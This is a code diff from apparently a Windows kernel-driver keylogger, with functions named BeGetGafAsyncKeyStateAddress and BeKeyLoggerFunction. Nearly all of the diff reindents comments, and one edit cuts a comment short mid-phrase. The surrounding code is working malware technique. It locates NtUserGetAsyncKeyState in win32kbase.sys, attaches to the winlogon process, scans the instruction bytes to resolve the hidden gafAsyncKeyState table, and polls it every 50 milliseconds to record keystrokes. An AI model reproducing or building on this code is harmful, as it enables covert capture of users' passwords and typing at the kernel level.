@@ -419,14 +419,14 @@ BeGetGafAsyncKeyStateAddress()
     KAPC_STATE Apc = { 0 };
 
     //
-	// Get Address of NtUserGetAsyncKeyState
-	//
+    // Get Address of NtUserGetAsyncKeyState
+    //
     DWORD64 NtUserGetAsyncKeyState = (DWORD64)BeGetSystemRoutineAddress("win32kbase.sys", "NtUserGetAsyncKeyState");
 	LOG_MSG("NtUserGetAsyncKeyState: 0x%llx\n", NtUserGetAsyncKeyState);
 	
     //
-	// To read session driver modules (such as win32kbase.sys, which contains NtUserGetAsyncKeyState), we need a process running in a user session 
-	// https://www.unknowncheats.me/forum/general-programming-and-reversing/492970-reading-memory-win32kbase-sys.html
+    // To read session driver modules (such as win32kbase.sys, which contains NtUserGetAsyncKeyState), we need a process running in a user session 
+    // https://www.unknowncheats.me/forum/general-programming-and-reversing/492970-reading-memory-win32kbase-sys.html
     //
 	KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
 
@@ -434,7 +434,7 @@ BeGetGafAsyncKeyStateAddress()
 	INT   I       = 0;
 
     //
-	// Resolve gafAsyncKeyState address
+    // Resolve gafAsyncKeyState address
     //
 	for (; I < 500; ++I)
 	{
@@ -445,13 +445,13 @@ BeGetGafAsyncKeyStateAddress()
 		)
 		{
             //
-			// param for MOV RAX QWORD PTR is the offset to the address of gafAsyncKeyState
+            // param for MOV RAX QWORD PTR is the offset to the address of 
             //
 			UINT32 Offset = (*(PUINT32)(NtUserGetAsyncKeyState + I + 3));
             
             //
             // 4 = length of offset value
-			//
+            //
             Address = (PVOID)(NtUserGetAsyncKeyState + I + 3 + 4 + Offset);
 			
             LOG_MSG("%02X %02X %02X %lx\n", *(BYTE*)(NtUserGetAsyncKeyState + I), *(BYTE*)(NtUserGetAsyncKeyState + I + 1), *(BYTE*)(NtUserGetAsyncKeyState + I + 2), Offset);
@@ -507,7 +507,7 @@ BeKeyLoggerFunction(_In_ PVOID StartContext)
 	}
 
     //
-	// Sleep for 0.05 seconds
+    // Sleep for 0.05 seconds
     //
 	LARGE_INTEGER Interval;
 	Interval.QuadPart = -1 * (LONGLONG)50 * 10000;
